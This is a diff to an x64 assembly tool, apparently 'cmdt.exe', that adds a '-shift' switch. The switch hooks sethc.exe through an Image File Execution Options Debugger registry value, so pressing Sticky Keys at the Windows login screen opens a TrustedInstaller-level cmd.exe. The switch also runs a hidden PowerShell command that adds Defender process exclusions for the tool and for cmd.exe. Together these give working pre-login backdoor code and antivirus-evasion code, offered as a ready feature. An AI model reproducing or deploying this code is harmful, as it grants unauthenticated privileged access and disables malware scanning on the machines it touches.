@@ -31,10 +31,14 @@ EXTRN GetModuleFileNameW:PROC
 EXTRN RegCreateKeyExW:PROC
 EXTRN RegSetValueExW:PROC
 EXTRN RegDeleteKeyW:PROC
+EXTRN RegDeleteValueW:PROC
+EXTRN RegOpenKeyExW:PROC
 EXTRN RegCloseKey:PROC
 EXTRN AttachConsole:PROC
 EXTRN GetStdHandle:PROC
 EXTRN WriteConsoleW:PROC
+EXTRN WaitForSingleObject:PROC
+EXTRN CloseHandle:PROC
 
 ; ==============================================================================
 ; CONSTANT STRING DATA
@@ -63,6 +67,10 @@ str_runas           dw 'r','u','n','a','s',0
 ; Context menu registration switches
 str_installSwitch   dw '-','i','n','s','t','a','l','l',0
 str_uninstallSwitch dw '-','u','n','i','n','s','t','a','l','l',0
+
+; Sticky Keys (sethc.exe) IFEO switches
+str_shiftSwitch     dw '-','s','h','i','f','t',0
+str_unshiftSwitch   dw '-','u','n','s','h','i','f','t',0
 
 ; Registry paths for Explorer context menu - Directory entries
 str_ctxKeyBg        dw 'D','i','r','e','c','t','o','r','y','\','B','a','c','k','g','r','o','u','n','d','\','s','h','e','l','l','\','C','M','D','T',0
@@ -93,6 +101,28 @@ str_cmdQuote        dw '"',0
 str_cmdSuffixDir    dw '"',' ','-','c','l','i',' ','-','n','e','w',' ','c','m','d','.','e','x','e',' ','/','k',' ','c','d',' ','/','d',' ','"','%','V','"',0
 str_cmdSuffixFile   dw '"',' ','"','%','1','"',0
 
+; IFEO registry path and values for sethc.exe hook
+str_ifeoKey         dw 'S','O','F','T','W','A','R','E','\'
+                    dw 'M','i','c','r','o','s','o','f','t','\'
+                    dw 'W','i','n','d','o','w','s',' ','N','T','\'
+                    dw 'C','u','r','r','e','n','t','V','e','r','s','i','o','n','\'
+                    dw 'I','m','a','g','e',' ','F','i','l','e',' '
+                    dw 'E','x','e','c','u','t','i','o','n',' '
+                    dw 'O','p','t','i','o','n','s','\'
+                    dw 's','e','t','h','c','.','e','x','e',0
+str_debuggerVal     dw 'D','e','b','u','g','g','e','r',0
+str_shiftSuffix     dw ' ','-','c','l','i',' ','-','n','e','w',' ','c','m','d','.','e','x','e',0
+
+; PowerShell executable and Defender exclusion command fragments (dynamic)
+str_powershell      dw 'p','o','w','e','r','s','h','e','l','l','.','e','x','e',0
+str_psAddPfx        dw '-','N','o','P','r','o','f','i','l','e',' ','-','c',' '
+                    dw '"','A','d','d','-','M','p','P','r','e','f','e','r','e','n','c','e',' '
+                    dw '-','E','x','c','l','u','s','i','o','n','P','r','o','c','e','s','s',' ',0
+str_psRemPfx        dw '-','N','o','P','r','o','f','i','l','e',' ','-','c',' '
+                    dw '"','R','e','m','o','v','e','-','M','p','P','r','e','f','e','r','e','n','c','e',' '
+                    dw '-','E','x','c','l','u','s','i','o','n','P','r','o','c','e','s','s',' ',0
+str_psSuffix        dw ',','c','m','d','.','e','x','e',' ','-','F','o','r','c','e','"',0
+
 ; Usage help text displayed when an unknown switch is given
 str_usage       dw 13,10
                 dw 'U','s','a','g','e',':',' ','c','m','d','t','.','e','x','e',' ','[','o','p','t','i','o','n',']',13,10
@@ -109,6 +139,12 @@ str_usage       dw 13,10
                 dw ' ',' ','-','u','n','i','n','s','t','a','l','l'
                 dw ' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
                 dw 'R','e','m','o','v','e',' ','c','o','n','t','e','x','t',' ','m','e','n','u',13,10
+                dw ' ',' ','-','s','h','i','f','t'
+                dw ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
+                dw 'H','o','o','k',' ','s','e','t','h','c','.','e','x','e',13,10
+                dw ' ',' ','-','u','n','s','h','i','f','t'
+                dw ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '
+                dw 'U','n','h','o','o','k',' ','s','e','t','h','c','.','e','x','e',13,10
                 dw 13,10
                 dw ' ',' ','N','o',' ','a','r','g','s',' ','t','o',' ','s','t','a','r','t',' ','G','U','I','.',13,10
                 dw 0
@@ -583,6 +619,20 @@ uac_already_admin:
     test rax, rax
     jnz mode_uninstall_found
 
+    ; Check if argv[1] matches "-shift"
+    lea rdx, str_shiftSwitch
+    mov rcx, r14
+    call wcscmp_ci
+    test rax, rax
+    jnz mode_shift_found
+
+    ; Check if argv[1] matches "-unshift"
+    lea rdx, str_unshiftSwitch
+    mov rcx, r14
+    call wcscmp_ci
+    test rax, rax
+    jnz mode_unshift_found
+
     ; No recognized switch: check if argv[1] starts with '-'
     cmp word ptr [r14], '-'
     je show_usage               ; Unknown switch, display available options
@@ -797,6 +847,30 @@ mode_uninstall_found:
     call LocalFree
     add rsp, 32
     call UninstallContextMenu
+    xor ecx, ecx
+    sub rsp, 32
+    call ExitProcess
+    add rsp, 32
+
+mode_shift_found:
+    ; Free argv and install sethc.exe IFEO hook
+    mov rcx, r13
+    sub rsp, 32
+    call LocalFree
+    add rsp, 32
+    call InstallShift
+    xor ecx, ecx
+    sub rsp, 32
+    call ExitProcess
+    add rsp, 32
+
+mode_unshift_found:
+    ; Free argv and remove sethc.exe IFEO hook
+    mov rcx, r13
+    sub rsp, 32
+    call LocalFree
+    add rsp, 32
+    call UninstallShift
     xor ecx, ecx
     sub rsp, 32
     call ExitProcess
@@ -1296,6 +1370,35 @@ exit_app:
 mainCRTStartup endp
 
 ; ==============================================================================
+; GetExeFileName - Extract filename from g_exePath
+;
+; Purpose: Scans g_exePath for the last backslash and returns a pointer
+;          to the character after it (the filename portion).
+;          Must call GetModuleFileNameW into g_exePath first.
+;
+; Parameters: None
+;
+; Returns: RAX = pointer to filename within g_exePath
+;
+; Modifies: RAX, RCX
+; ==============================================================================
+GetExeFileName proc
+    lea rax, g_exePath
+    mov rcx, rax
+@@:
+    cmp word ptr [rcx], 0
+    je @F
+    cmp word ptr [rcx], '\'
+    jne gef_next
+    lea rax, [rcx+2]
+gef_next:
+    add rcx, 2
+    jmp @B
+@@:
+    ret
+GetExeFileName endp
+
+; ==============================================================================
 ; InstallContextMenu - Register Explorer context menu entries
 ;
 ; Purpose: Creates registry keys under HKEY_CLASSES_ROOT for context menu
@@ -1730,5 +1833,242 @@ UninstallContextMenu proc
     add rsp, 40
     ret
 UninstallContextMenu endp
+
+; ==============================================================================
+; InstallShift - Set sethc.exe IFEO debugger hook
+;
+; Purpose: Creates an Image File Execution Options registry entry for sethc.exe
+;          that redirects execution to CMDT. When Sticky Keys is triggered
+;          (5x Shift at login screen), CMDT launches cmd.exe as TrustedInstaller
+;          instead of sethc.exe. Also adds Defender process exclusions for both
+;          the exe itself and cmd.exe.
+;
+; Registry location:
+;   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
+;     Image File Execution Options\sethc.exe
+;   Value: Debugger = <exename> -cli -new cmd.exe
+;
+; Parameters: None (uses global g_exePath and g_cmdBuf buffers)
+;
+; Returns: None
+;
+; Stack frame: 104 bytes
+; ==============================================================================
+InstallShift proc
+    push rbx
+    push r12
+    sub rsp, 104
+    ; [rsp+72] = hKey, [rsp+80] = dwDisp
+
+    ; Get our exe path
+    lea rdx, g_exePath
+    mov r8d, 260
+    xor ecx, ecx
+    call GetModuleFileNameW
+
+    ; Get just the filename (e.g. "cmdt.exe")
+    call GetExeFileName
+    mov r12, rax
+
+    ; Build PS add exclusion command in g_cmdBuf:
+    ; -NoProfile -c "Add-MpPreference -ExclusionProcess <filename>,cmd.exe -Force"
+    lea rcx, g_cmdBuf
+    lea rdx, str_psAddPfx
+    call wcscpy_p
+    lea rcx, g_cmdBuf
+    mov rdx, r12
+    call wcscat_p
+    lea rcx, g_cmdBuf
+    lea rdx, str_psSuffix
+    call wcscat_p
+
+    ; Add Defender process exclusions
+    lea rcx, g_cmdBuf
+    call RunPsCommand
+
+    ; Build IFEO debugger value in g_tempBuf: <full_path> -cli -new cmd.exe
+    lea rcx, g_tempBuf
+    lea rdx, g_exePath
+    call wcscpy_p
+    lea rcx, g_tempBuf
+    lea rdx, str_shiftSuffix
+    call wcscat_p
+
+    ; Calculate byte size (chars+1) * 2
+    lea rcx, g_tempBuf
+    call wcslen_p
+    lea rbx, [rax+1]
+    shl rbx, 1
+
+    ; Create/open IFEO sethc.exe key under HKLM
+    lea rax, [rsp+80]
+    mov qword ptr [rsp+64], rax     ; lpdwDisposition
+    lea rax, [rsp+72]
+    mov qword ptr [rsp+56], rax     ; phkResult
+    mov qword ptr [rsp+48], 0       ; lpSecurityAttributes
+    mov qword ptr [rsp+40], KEY_WRITE
+    mov qword ptr [rsp+32], 0       ; dwOptions
+    xor r9, r9                      ; lpClass
+    xor r8d, r8d                    ; Reserved
+    lea rdx, str_ifeoKey
+    mov ecx, HKEY_LOCAL_MACHINE
+    call RegCreateKeyExW
+    test eax, eax
+    jnz shift_install_done
+
+    ; Set Debugger = command string
+    mov qword ptr [rsp+40], rbx     ; cbData
+    lea rax, g_tempBuf
+    mov qword ptr [rsp+32], rax     ; lpData
+    mov r9d, REG_SZ                 ; dwType
+    xor r8d, r8d                    ; Reserved
+    lea rdx, str_debuggerVal        ; lpValueName = "Debugger"
+    mov rcx, [rsp+72]              ; hKey
+    call RegSetValueExW
+
+    mov rcx, [rsp+72]
+    call RegCloseKey
+
+shift_install_done:
+    add rsp, 104
+    pop r12
+    pop rbx
+    ret
+InstallShift endp
+
+; ==============================================================================
+; UninstallShift - Remove sethc.exe IFEO Debugger value
+;
+; Purpose: Deletes only the "Debugger" value from the Image File Execution
+;          Options\sethc.exe registry key, restoring normal Sticky Keys
+;          behavior. Also removes Defender process exclusions for both the
+;          exe itself and cmd.exe.
+;
+; Parameters: None
+;
+; Returns: None
+;
+; Stack frame: 48 bytes
+; ==============================================================================
+UninstallShift proc
+    push r12
+    sub rsp, 48
+    ; [rsp+40] = hKey
+
+    ; Open IFEO sethc.exe key
+    lea rax, [rsp+40]
+    mov qword ptr [rsp+32], rax     ; phkResult = &hKey
+    mov r9d, KEY_WRITE              ; samDesired
+    xor r8d, r8d                    ; ulOptions
+    lea rdx, str_ifeoKey            ; lpSubKey
+    mov ecx, HKEY_LOCAL_MACHINE     ; hKey
+    call RegOpenKeyExW
+    test eax, eax
+    jnz unshift_ps                  ; Key doesn't exist, skip to PS cleanup
+
+    ; Delete only the Debugger value
+    lea rdx, str_debuggerVal
+    mov rcx, [rsp+40]
+    call RegDeleteValueW
+
+    ; Close key
+    mov rcx, [rsp+40]
+    call RegCloseKey
+
+unshift_ps:
+    ; Get our exe path for dynamic filename
+    lea rdx, g_exePath
+    mov r8d, 260
+    xor ecx, ecx
+    call GetModuleFileNameW
+
+    ; Get just the filename
+    call GetExeFileName
+    mov r12, rax
+
+    ; Build PS remove exclusion command in g_cmdBuf:
+    ; -NoProfile -c "Remove-MpPreference -ExclusionProcess <filename>,cmd.exe -Force"
+    lea rcx, g_cmdBuf
+    lea rdx, str_psRemPfx
+    call wcscpy_p
+    lea rcx, g_cmdBuf
+    mov rdx, r12
+    call wcscat_p
+    lea rcx, g_cmdBuf
+    lea rdx, str_psSuffix
+    call wcscat_p
+
+    ; Remove Defender process exclusions
+    lea rcx, g_cmdBuf
+    call RunPsCommand
+
+    add rsp, 48
+    pop r12
+    ret
+UninstallShift endp
+
+; ==============================================================================
+; RunPsCommand - Execute a PowerShell command and wait for completion
+;
+; Purpose: Runs powershell.exe with given parameters using ShellExecuteExW
+;          with SW_HIDE, waits for the process to finish, then cleans up.
+;
+; Parameters:
+;   RCX = Pointer to wide string with PowerShell parameters
+;
+; Returns: None
+;
+; Stack frame: 152 bytes (32 shadow + 112 SHELLEXECUTEINFOW + 8 pad)
+; ==============================================================================
+RunPsCommand proc
+    push rbx
+    push rdi
+    sub rsp, 152
+    ; [rsp+0..31] = shadow space
+    ; [rsp+32..143] = SHELLEXECUTEINFOW (112 bytes)
+
+    mov rbx, rcx                ; RBX = lpParameters
+
+    ; Zero SHELLEXECUTEINFOW
+    lea rdi, [rsp+32]
+    xor rax, rax
+    mov rcx, 14                 ; 112 / 8 = 14 qwords
+@@:
+    mov qword ptr [rdi], rax
+    add rdi, 8
+    dec rcx
+    jnz @B
+
+    ; Fill SHELLEXECUTEINFOW fields
+    mov dword ptr [rsp+32], 112             ; cbSize
+    mov dword ptr [rsp+36], 00000040h       ; fMask = SEE_MASK_NOCLOSEPROCESS
+    lea rax, str_powershell
+    mov qword ptr [rsp+56], rax             ; lpFile = "powershell.exe"
+    mov qword ptr [rsp+64], rbx             ; lpParameters
+    mov dword ptr [rsp+80], SW_HIDE         ; nShow = 0
+
+    ; Launch PowerShell
+    lea rcx, [rsp+32]
+    call ShellExecuteExW
+    test eax, eax
+    jz ps_done
+
+    ; Wait for PowerShell to complete
+    mov rcx, qword ptr [rsp+136]            ; hProcess (offset 104 from struct start = 32+104=136)
+    test rcx, rcx
+    jz ps_done
+    mov edx, 0FFFFFFFFh                     ; INFINITE
+    call WaitForSingleObject
+
+    ; Close process handle
+    mov rcx, qword ptr [rsp+136]
+    call CloseHandle
+
+ps_done:
+    add rsp, 152
+    pop rdi
+    pop rbx
+    ret
+RunPsCommand endp
 
 end
